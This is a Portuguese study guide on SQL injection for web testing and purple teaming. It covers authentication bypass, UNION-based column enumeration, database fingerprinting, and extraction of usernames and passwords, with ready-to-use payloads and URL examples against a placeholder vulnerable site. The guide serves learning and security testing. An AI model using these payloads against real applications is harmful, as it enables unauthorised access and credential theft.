---

# 📚 Guia Avançado de Estudo e Revisão: SQL Injection (Foco Web & Purple Teaming)

## 1. Subversão de Lógica de Autenticação (`Authentication Bypass`)

* **Fundamento Teórico:** O ataque explora a validação frouxa de strings onde a entrada do usuário é concatenada diretamente na query de autenticação sem sanitização ou uso de Prepared Statements.
* **Mecanismo de Comentário por SGBD:**
* **MySQL/SQLite:** `-- ` (nota: o espaço é obrigatório no MySQL) ou `#`.
* **PostgreSQL/Oracle/MSSQL:** `--` (espaço opcional, mas recomendado).
* **C-Style (Geral):** `/* ... */` (útil para comentar o restante da query após a injeção).


* **Variações de Payload:**
* `' OR 1=1 --`
* `admin')--` (para fechar parênteses abertos na query original).
* `admin'/*`



---

## 2. Bypass de Filtros e Lógica Booleana Básica (`In-Band & Error-Based Setup`)

* **Manipulação de Cláusulas:** Alterar a árvore sintática da instrução original injetando condições lógicas sempre verdadeiras (`OR 1=1`).
* **Estratégia de Resposta:** Identificar a diferença entre os estados da aplicação:
* **200 OK com dados a mais:** O filtro lógico foi quebrado com sucesso.
* **500 Internal Server Error:** A sintaxe está correta, mas houve uma exceção no banco de dados (ex: desalinhamento de colunas ou tipos).
* **Respostas customizadas (ex: "Product not found"):** O WAF ou o código da aplicação bloqueou padrões específicos (como a palavra `UNION` ou `'`).



---

## 3. SQL Injection Baseado em UNION (`UNION-Based SQLi`)

O UNION combina o resultado de duas ou mais instruções `SELECT` em um único conjunto de resultados retornado pela aplicação.

### Pré-requisitos estritos:

1. **Mesmo número de colunas:** Ambas as queries devem projetar a mesma quantidade de colunas. Se a original tem 2 e a injetada tem 3, o banco retorna erro.
2. **Compatibilidade de tipos de dados por posição:** Se a coluna 1 da query original é do tipo `INTEGER`, a coluna 1 da query `UNION` deve ser `INTEGER` (ou conversível implicitamente). O uso de `NULL` resolve isso na fase de reconhecimento, pois o `NULL` é polimórfico e aceito em quase qualquer tipo de dado.

---

## 4. Metodologia de Mapeamento Prático (Enumerando a Estrutura)

### Fase A: Descoberta do Número de Colunas

* **Método 1: `ORDER BY**`
* *Como funciona:* Força o banco a ordenar o resultado pela coluna $N$. Se o índice ultrapassar o número real de colunas da query, o banco lança um erro.
* *Exemplo:* `' ORDER BY 1--` $\rightarrow$ `' ORDER BY 2--` $\rightarrow$ se o 3 der erro, existem 2 colunas.


* **Método 2: `UNION SELECT NULL**`
* *Como funciona:* Adiciona colunas vazias progressivamente até que a aplicação retorne uma resposta HTTP 200 válida.
* *Exemplo:* `' UNION SELECT NULL, NULL--`



### Fase B: Descoberta de Tipos de Dados (`String Probing`)

* *Objetivo:* Encontrar quais posições no conjunto de resultados aceitam dados textuais (`VARCHAR`, `TEXT`), pois colunas numéricas não servem para extrair strings como senhas ou hashes.
* *Metodologia:* Substituir sequencialmente cada `NULL` por uma string de teste (ex: `'a'`).
* `UNION SELECT 'a', NULL, NULL--` (Se retornar 200, a Coluna 1 aceita texto).
* `UNION SELECT NULL, 'a', NULL--` (Se retornar erro, a Coluna 2 é numérica/data).



---

## 5. Dialetos e Peculiaridades por SGBD (`Database Quirks`)

| SGBD | Regra de Comentário | Tabela Dummy (Obrigatória em SELECT sem FROM?) | Função de Concatenação |
| --- | --- | --- | --- |
| **MySQL** | `-- ` (com espaço) ou `#` | Não obrigatório (`SELECT 1`) | `CONCAT(a, b, c)` |
| **PostgreSQL** | `--` | Não obrigatório | `a || b || c` |
| **Oracle** | `--` | **Obrigatório** (`FROM DUAL`) | `a || b || c` |
| **Microsoft SQL Server** | `--` | Não obrigatório | `a + b + c` |

---

## 6. Extração de Dados e Técnicas de Agregação (`Data Exfiltration`)

### Extração Direta (Múltiplas Colunas úteis)

Quando a aplicação exibe mais de uma coluna de texto na tela:

* `' UNION SELECT username, password FROM users--`

### Extração via Concatenação (Coluna Única útil)

Quando a aplicação exibe apenas **uma** coluna de texto na interface, mas você precisa extrair múltiplos campos simultaneamente.

* **MySQL:** `' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--`
* **PostgreSQL / Oracle:** `' UNION SELECT NULL, username || ':' || password FROM users--`
* **MSSQL:** `' UNION SELECT NULL, username + ':' + password FROM users--`

---

## 7. Fingerprinting do Banco de Dados (`Database Version Enumeration`)

Identificar o SGBD exato é vital para saber qual sintaxe de payload utilizar nas fases seguintes.

* **MySQL / Microsoft SQL Server:**
`' UNION SELECT @@version, NULL--`
* **PostgreSQL:**
`' UNION SELECT version(), NULL--`
* **Oracle:**
`' UNION SELECT banner, NULL FROM v$version--`

---

## 8. Exemplos Práticos de Payload (URL / Burp Suite)

### 1. Burlar Filtro (Trazer tudo):

`[https://site-vulneravel.com/products?category=Gifts'+OR+1=1--](https://site-vulneravel.com/products?category=Gifts'+OR+1=1--)`

### 2. Mapear Quantidade de Colunas com ORDER BY:

`[https://site-vulneravel.com/products?category=Gifts'+ORDER+BY+1--](https://site-vulneravel.com/products?category=Gifts'+ORDER+BY+1--)`

`[https://site-vulneravel.com/products?category=Gifts'+ORDER+BY+2--](https://site-vulneravel.com/products?category=Gifts'+ORDER+BY+2--)`

`[https://site-vulneravel.com/products?category=Gifts'+ORDER+BY+3--](https://site-vulneravel.com/products?category=Gifts'+ORDER+BY+3--)` (Se der erro aqui, a busca usa exatamente 2 colunas)

### 3. Mapear Quantidade de Colunas com UNION NULL:

`[https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+NULL--](https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+NULL--)` (Retorna Erro 500)

`[https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+NULL,NULL--](https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+NULL,NULL--)` (Retorna HTTP 200 OK -> Confirmado: 2 colunas!)

### 4. Mapear Qual Coluna Aceita Texto (String):

*(Testando uma por uma até achar qual não dá erro e reflete o 'a' na tela)*

`[https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+'a',NULL--](https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+'a',NULL--)` (Testa Coluna 1)

`[https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+NULL,'a'--](https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+NULL,'a'--)` (Testa Coluna 2)

## 5. Examinando base de dados

`[https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+@@version--](https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+@@version--)`

> 💡 **Dica de Burp Suite:** Ao injetar diretamente na URL via Proxy/Repeater, lembre-se de codificar os caracteres especiais (`Ctrl + U`). O espaço vira `+` e as aspas simples viram `%27`.
